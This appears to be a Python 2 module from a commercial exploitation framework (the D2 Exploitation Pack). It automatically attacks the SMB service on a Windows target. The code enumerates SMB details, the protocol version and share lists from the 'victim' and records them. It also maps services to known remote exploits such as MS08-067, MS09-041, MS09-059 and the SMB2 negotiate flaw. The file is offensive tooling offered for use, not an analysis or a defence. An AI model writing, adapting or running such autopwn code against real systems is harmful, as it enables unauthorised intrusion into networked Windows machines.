#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import autopwn
import proto.smbv2
import xmlrpclib

class run(autopwn.run):

  CANVAS_EXPLOITS = {
    'Print provider': ['Get the print providers on a remote Windows machine', 'getprintproviders'],
    'Windows Telephony Service': ['Windows Telephony Service Overflow', 'ms05_040'],
    'Windows Print Spooler': ['Windows Print Spooler win32spl.dll Heap Overflow', 'ms05_043'],
    'Windows Server Service': ['Windows Server Service CanonicalizePathName() Stack Underflow', 'ms08_067'],
    'Microsoft Windows Print Spooler': ['Microsoft Windows Print Spooler Overflow', 'ms09_022'],
    'Windows Server Service': ['Windows Server Service NetrGetJoinDomainInformation() Double Free', 'ms09_041'],
    'LSASS NTLM Authenticate': ['LSASS NTLM Authenticate Vulnerability', 'ms09_059'],
    'SMB2 Negotiate': ['SMB2 Negotiate Pointer Dereference Vulnerability', 'smb2_negotiate_remote'],
  }

  def exploit(self, target, port):
    try:
      nfo = proto.smbv2.discovery(target)
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    if nfo:
      self.log.info('Information leaking through SMB')
      self.log.debug('%s' % nfo)
      self.db.db_unique_info(self.victim, self.service, 'Information leaking through SMB', 'autopwn_smb', nfo)

    try:
      nfo = proto.smbv2.checkv2(target)
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    if nfo:
      self.log.info('%s' % nfo)
      self.db.db_unique_info(self.victim, self.service, 'SMB Version', 'autopwn_smb', nfo)

    try:
      nfo = proto.smbv2.listshares(target)
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    if nfo:
      self.log.info('Shares list')
      self.log.debug('%s' % nfo)
      self.db.db_unique_info(self.victim, self.service, 'Shares list', 'autopwn_smb', nfo)

    self.list_exploits()
